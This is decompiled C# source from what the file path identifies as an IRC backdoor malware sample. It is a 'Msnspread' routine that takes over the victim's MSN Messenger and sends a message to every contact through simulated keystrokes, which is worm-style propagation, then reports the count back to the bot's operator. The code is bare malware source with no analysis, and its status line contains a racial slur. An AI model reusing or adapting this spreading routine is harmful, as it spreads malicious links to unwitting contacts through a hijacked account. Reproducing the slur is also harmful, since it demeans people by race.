// Decompiled with JetBrains decompiler
// Type: Realtek.Msnspread
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using MSNMessengerAPI;
using System.Threading;
using System.Windows.Forms;

namespace Realtek
{
  internal class Msnspread
  {
    public static void MsnSend(string message)
    {
      try
      {
        Messenger messenger = (Messenger) new MessengerClass();
        IMSNMessengerContacts myContacts = (IMSNMessengerContacts) ((IMSNMessenger3) messenger).MyContacts;
        int num = 0;
        foreach (IMSNMessengerContact messengerContact in myContacts)
        {
          try
          {
            ((IMSNMessenger3) messenger).InstantMessage((object) messengerContact);
            SendKeys.SendWait(message);
            Thread.Sleep(500);
            SendKeys.SendWait("{ENTER}");
            SendKeys.SendWait("{ESCAPE}");
            ++num;
            Thread.Sleep(2000);
          }
          catch
          {
          }
        }
        if (num <= 1)
          return;
        Program.Writer.WriteLine(Program.MessageGreen + "Message sent to " + (object) num + " niggers");
      }
      catch
      {
      }
    }
  }
}
